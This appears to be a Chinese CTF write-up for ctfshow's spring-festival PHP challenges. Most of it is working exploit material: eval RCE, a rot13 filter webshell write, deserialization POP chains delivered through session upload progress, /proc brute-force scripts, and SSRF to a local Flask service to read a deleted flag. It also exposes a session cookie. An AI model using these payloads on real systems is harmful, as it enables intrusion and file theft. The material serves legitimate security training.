+++
title = "ctfshow新春欢乐赛"
slug = "ctfshow-spring-festival-fun-match"
description = "刷"
date = "2025-01-19T18:53:56"
lastmod = "2025-01-19T18:53:56"
image = ""
license = ""
categories = ["ctfshow"]
tags = ["php"]
+++

## 热身

```php
<?php

eval($_GET['f']);
```

直接RCE这是真热身

```
?f=phpinfo();
# auto_append_file拿到文件位置
?f=system("tac /etc/ssh/secret/youneverknow/secret.php");
```

## web1

```php
<?php

highlight_file(__FILE__);
error_reporting(0);

$content = $_GET[content];
file_put_contents($content,'<?php exit();'.$content);
```

很经典的问题，死亡exit绕过，直接打

```
?content=php://filter/write=string.rot13|<?cuc @riny($_CBFG[pzq]);?>|/resource=shell.php
```

然后在`/shell.php`，密码是`cmd`

## web2

```php
<?php

highlight_file(__FILE__);
session_start();
error_reporting(0);

include "flag.php";

if(count($_POST)===1){
        extract($_POST);
        if (call_user_func($$$$$${key($_POST)})==="HappyNewYear"){
                echo $flag;
        }
}
?>
```

PHP中`$`的利用，也是直接干，这里看着有六个`$`其实就当成是两个就好了，并且可以变量覆盖，其中有`session_start();`直接来

```
session_id=session_id

PHPSESSID=HappyNewYear
```

## web3

```php
<?php

highlight_file(__FILE__);
error_reporting(0);

include "flag.php";
$key=  call_user_func(($_GET[1]));

if($key=="HappyNewYear"){
  echo $flag;
}

die("虎年大吉，新春快乐！");
```

这里是一个弱比较，如果函数返回true就可以过

```
?1=session_start
?1=error_reporting
?1=json_last_error
```

## web4

```php
<?php

highlight_file(__FILE__);
error_reporting(0);

$key=  call_user_func(($_GET[1]));
file_put_contents($key, "<?php eval(\$_POST[1]);?>");

die("虎年大吉，新春快乐！");

虎年大吉，新春快乐！
```

前几天做大牛杯的时候有个函数，其默认文件后缀为`inc`和`php`，这里也是利用这个函数

```
?1=spl_autoload_extensions
```

然后访问`/.inc,.php`，没想到吧，这个文件名这么奇怪，而且还把`phpinfo`给disable了

## web5

```php
<?php

error_reporting(0);
highlight_file(__FILE__);


include "🐯🐯.php";
file_put_contents("🐯", $flag);
$🐯 = str_replace("hu", "🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯", $_POST['🐯']);
file_put_contents("🐯", $🐯);
```

当`file_put_contents`写文件的时候，是覆盖的，这个我们都知道，那我们现在是要直接访问🐯拿到flag，当时现在已经给写覆盖了，这里使用内存溢出来解决这个问题，传入足够的`hu`，传多了会失败传少了会不成功

```python
import requests
url="http://ee7e1aa6-53c1-4113-bd07-7847fe95f9c3.challenge.ctf.show/"

payload=524280*"hu"

data={"🐯":payload}
r=requests.post(url,data)
print(r.text)
```

然后访问拿flag就可以了

## web6

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
$function = $_GET['POST'];

function filter($img){
    $filter_arr = array('ctfshow','daniu','happyhuyear');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

if($_SESSION){
    unset($_SESSION);
}

$_SESSION['function'] = $function;

extract($_POST['GET']);

$_SESSION['file'] = base64_encode("/root/flag");

$serialize_info = filter(serialize($_SESSION));

if($function == 'GET'){
    $userinfo = unserialize($serialize_info);
    //出题人已经拿过flag，题目正常,也就是说...
    echo file_get_contents(base64_decode($userinfo['file']));
}
```

字符逃逸，很简单的代码，没有pop链子，首先要`$function == 'GET'`才会反序列化，然后测试逃逸的写个demo，参数覆盖来打开日志文件我们就可以拿到`flag`了

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
$function = $_GET['POST'];

function filter($img){
    $filter_arr = array('ctfshow','daniu','happyhuyear');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

if($_SESSION){
    unset($_SESSION);
}

$_SESSION['function'] = $function;

extract($_POST['GET']);

$_SESSION['file'] = base64_encode("/root/flag");
echo $_SESSION['file']."\n";
$serialize_info = filter(serialize($_SESSION));
echo $serialize_info."\n";
if($function == 'GET'){
    $userinfo = unserialize($serialize_info);
    echo $userinfo['file']."\n";
    echo file_get_contents(base64_decode($userinfo['file']));
}
```

准备好我们的字符串

```
";s:1:"1";s:4:"file";s:36:"L3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZw==";}
```

然后得到的是

```
L3Jvb3QvZmxhZw== 
a:2:{s:12:"";s:66:"";s:1:"1";s:4:"file";s:36:"L3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZw==";}";s:4:"file";s:16:"L3Jvb3QvZmxhZw==";}
```

我们只要逃逸下面这个部分即可

```
";s:66:"
```

总共是八个字符，但是凑不齐，我们补上`s:1:`，刚好12个字符就可以了

```
?POST=GET

GET[_SESSION][ctfshowdaniu]=s:1:";s:1:"1";s:4:"file";s:36:"L3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZw==";}
```

然后没读到信息，那么我们读取配置文件

```
GET[_SESSION][ctfshowdaniu]=s:1:";s:1:"1";s:4:"file";s:28:"L2V0Yy9uZ2lueC9uZ2lueC5jb25m";}
```

拿到了flag

## web7

```php
<?php
include("class.php");
error_reporting(0);
highlight_file(__FILE__);
ini_set("session.serialize_handler", "php");
session_start();

if (isset($_GET['phpinfo']))
{
    phpinfo();
}
if (isset($_GET['source']))
{
    highlight_file("class.php");
}

$happy=new Happy();
$happy();
?>
```

一看就是session反序列化啊这里

```php
<?php
    class Happy {
        public $happy;
        function __construct(){
                $this->happy="Happy_New_Year!!!";

        }
        function __destruct(){
                $this->happy->happy;

        }
        public function __call($funName, $arguments){
                die($this->happy->$funName);
        }

        public function __set($key,$value)
        {
            $this->happy->$key = $value;
        }
        public function __invoke()
        {
            echo $this->happy;
        }


    }

    class _New_{
        public $daniu;
        public $robot;
        public $notrobot;
        private $_New_;
        function __construct(){
                $this->daniu="I'm daniu.";
                $this->robot="I'm robot.";
                $this->notrobot="I'm not a robot.";

        }
        public function __call($funName, $arguments){
                echo $this->daniu.$funName."not exists!!!";
        }

        public function __invoke()
        {
            echo $this->daniu;
            $this->daniu=$this->robot;
            echo $this->daniu;
        }
        public function __toString()
        {
            $robot=$this->robot;
            $this->daniu->$robot=$this->notrobot;
            return (string)$this->daniu;

        }
        public function __get($key){
               echo $this->daniu.$key."not exists!!!";
        }

 }
    class Year{
        public $zodiac;
         public function __invoke()
        {
            echo "happy ".$this->zodiac." year!";

        }
         function __construct(){
                $this->zodiac="Hu";
        }
        public function __toString()
        {
                $this->show();

        }
        public function __set($key,$value)#3
        {
            $this->$key = $value;
        }

        public function show(){
            die(file_get_contents($this->zodiac));
        }
        public function __wakeup()
        {
            $this->zodiac = 'hu';
        }

    }
?>
```

明天看，今天休息了

---

嘿嘿我回来了，这里我们先看pop链子是怎么样的

```
Happy::__destruct()->_New_::__get()->Year::toString()->Year::show()
```

然后本地测试发现可行，绕过wakeup可以使用`fast-destruct`

```php
<?php
class Happy {
    public $happy;
}

class _New_{
    public $daniu;
}
class Year{
    public $zodiac;
}
$a=new Happy();
$a->happy=new _New_();
$a->happy->daniu=new Year();
$a->happy->daniu->zodiac="/etc/passwd";
echo "|".serialize($a);
```

写个html表单来发包，免得自己写数据包。因为我们用的progress来上传

```html
<form action="https://8705bd37-db7a-428d-a67b-eb475e154d88.challenge.ctf.show/" method="POST" enctype="multipart/form-data">
    <!--题目地址 -->
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
    <input type="file" name="file" />
    <input type="submit" />
</form>
```

数据包应该是这样的

```http
POST / HTTP/1.1
Host: 8705bd37-db7a-428d-a67b-eb475e154d88.challenge.ctf.show
Cookie: cf_clearance=FfFkJ_rCEzOW7OasGYKDaQdTABU_BVynV76XtJXtEMk-1737092124-1.2.1.1-08wtjOyMUOY8ThDT33UiGmkBadSYm33GtZ8UEqnhMYn45iIQYIfmtkdn0rCEq2cLjGXf0XdRXNrM4molLyQ8vDQnKyYt1ixrhYI8wUqSsnE_reHQM3L6B3Gr67nSRP1zSwCAeJEqXOf02wzTlhdAoBkjyG4DbDdMuMDw6HuBeMCHow7p3zZfJTguhcrd.YRyR8ZagXt2h1DBgZSdnioehaLAzj2nA8s1weMd_HWveEI4ls1PWJz.ADM_9UTNjpCJL6Rlu3t3JqrqEctObC1eUoGYZYf3LWHGDpgLNPYoVjs; PHPSESSID=aa94227bf301522e3d422855678582d0
Content-Length: 426
Cache-Control: max-age=0
Sec-Ch-Ua: "Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryL9NdNuBtERMjHZvY
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Priority: u=0, i
Connection: close

------WebKitFormBoundaryL9NdNuBtERMjHZvY
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

123
------WebKitFormBoundaryL9NdNuBtERMjHZvY
Content-Disposition: form-data; name="file"; filename="|O:5:\"Happy\":1:{s:5:\"happy\";O:5:\"_New_\":1:{s:5:\"daniu\";O:4:\"Year\":1:{s:6:\"zodiac\";s:11:\"/etc/passwd\";}}"
Content-Type: application/octet-stream

test
------WebKitFormBoundaryL9NdNuBtERMjHZvY--

```

就读取到了，但是我们直接读取根目录的flag没有成功，这里我们读取一下进程看看

```python
import requests
import time
# 创建会话
session = requests.session()

# 请求的 URL
burp0_url = "http://8705bd37-db7a-428d-a67b-eb475e154d88.challenge.ctf.show:443/"

# Cookies
burp0_cookies = {
    "cf_clearance": "FfFkJ_rCEzOW7OasGYKDaQdTABU_BVynV76XtJXtEMk-1737092124-1.2.1.1-08wtjOyMUOY8ThDT33UiGmkBadSYm33GtZ8UEqnhMYn45iIQYIfmtkdn0rCEq2cLjGXf0XdRXNrM4molLyQ8vDQnKyYt1ixrhYI8wUqSsnE_reHQM3L6B3Gr67nSRP1zSwCAeJEqXOf02wzTlhdAoBkjyG4DbDdMuMDw6HuBeMCHow7p3zZfJTguhcrd.YRyR8ZagXt2h1DBgZSdnioehaLAzj2nA8s1weMd_HWveEI4ls1PWJz.ADM_9UTNjpCJL6Rlu3t3JqrqEctObC1eUoGYZYf3LWHGDpgLNPYoVjs",
    "PHPSESSID": "aa94227bf301522e3d422855678582d0"
}

# 请求头
burp0_headers = {
    "Cache-Control": "max-age=0",
    "Sec-Ch-Ua": "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\", \"Google Chrome\";v=\"132\"",
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": "\"Windows\"",
    "Origin": "null",
    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryL9NdNuBtERMjHZvY",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
    "Priority": "u=0, i",
    "Connection": "close"
}

for pid in range(999):
    # POST 数据
    file = f"/proc/{pid}/cmdline"
    # print(file)

    # 计算文件名长度
    i = len(file)
    # print(i)

    burp0_data = (
        "------WebKitFormBoundaryL9NdNuBtERMjHZvY\r\n"
        "Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n"
        "123\r\n"
        "------WebKitFormBoundaryL9NdNuBtERMjHZvY\r\n"
        "Content-Disposition: form-data; name=\"file\"; filename=\"|O:5:\\\"Happy\\\":1:{s:5:\\\"happy\\\";O:5:\\\"_New_\\\":1:{s:5:\\\"daniu\\\";O:4:\\\"Year\\\":1:{s:6:\\\"zodiac\\\";s:"+ str(i) +":\\\"/proc/"+ str(pid)+"/cmdline\\\";}}\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n"
        "test\r\n"
        "------WebKitFormBoundaryL9NdNuBtERMjHZvY--\r\n"
    )

    # 发送 POST 请求
    response = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
    time.sleep(0.08)
    # 打印响应内容
    if response.status_code == 200:
        print(response.text)
        print(file)

```

虽然跑出来很多502但是无伤大雅，我们找到在114进程有个py服务，读取文件看看

```
python3 /app/server.py 
```

```python
from flask import *
import os

app = Flask(__name__)
flag=open('/flag','r')
#flag我删了
os.remove('/flag')

@app.route('/', methods=['GET', 'POST'])
def index():
	return "flag我删了，你们别找了"

@app.route('/download/', methods=['GET', 'POST'])
def download_file():
    return send_file(request.args['filename'])


if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False)
```

我们可以利用5000端口的服务进行任意文件读取

> 在 /proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的 fd

所以直接接着跑

```python
import requests
import time

# 创建会话
session = requests.session()

# 请求的 URL
burp0_url = "http://0e15cac1-38f3-4a49-82ed-31ba336cfd35.challenge.ctf.show/"

# Cookies
burp0_cookies = {
    "cf_clearance": "FfFkJ_rCEzOW7OasGYKDaQdTABU_BVynV76XtJXtEMk-1737092124-1.2.1.1-08wtjOyMUOY8ThDT33UiGmkBadSYm33GtZ8UEqnhMYn45iIQYIfmtkdn0rCEq2cLjGXf0XdRXNrM4molLyQ8vDQnKyYt1ixrhYI8wUqSsnE_reHQM3L6B3Gr67nSRP1zSwCAeJEqXOf02wzTlhdAoBkjyG4DbDdMuMDw6HuBeMCHow7p3zZfJTguhcrd.YRyR8ZagXt2h1DBgZSdnioehaLAzj2nA8s1weMd_HWveEI4ls1PWJz.ADM_9UTNjpCJL6Rlu3t3JqrqEctObC1eUoGYZYf3LWHGDpgLNPYoVjs",
    "PHPSESSID": "aa94227bf301522e3d422855678582d0"
}

# 请求头
burp0_headers = {
    "Cache-Control": "max-age=0",
    "Sec-Ch-Ua": "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\", \"Google Chrome\";v=\"132\"",
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": "\"Windows\"",
    "Origin": "null",
    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryL9NdNuBtERMjHZvY",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
    "Priority": "u=0, i",
    "Connection": "close"
}

for pid in range(2,999):
    # POST 数据
    file = f"http://127.0.0.1:5000/download/?filename=/proc/self/fd/{pid}"

    # 计算文件名长度
    i = len(file)

    burp0_data = (
        "------WebKitFormBoundaryL9NdNuBtERMjHZvY\r\n"
        "Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n"
        "123\r\n"
        "------WebKitFormBoundaryL9NdNuBtERMjHZvY\r\n"
        "Content-Disposition: form-data; name=\"file\"; filename=\"|O:5:\\\"Happy\\\":1:{s:5:\\\"happy\\\";O:5:\\\"_New_\\\":1:{s:5:\\\"daniu\\\";O:4:\\\"Year\\\":1:{s:6:\\\"zodiac\\\";s:" + str(i) + ":\\\"http://127.0.0.1:5000/download/?filename=/proc/self/fd/" + str(pid) + "\\\";}}\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n"
        "test\r\n"
        "------WebKitFormBoundaryL9NdNuBtERMjHZvY--\r\n"
    )

    # 发送 POST 请求
    response = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
    time.sleep(0.08)

    # 打印响应内容
    # if response.status_code == 200:
    print(response.text)
    print(file)

```

在这个地方拿到

```
http://127.0.0.1:5000/download/?filename=/proc/self/fd/3
```



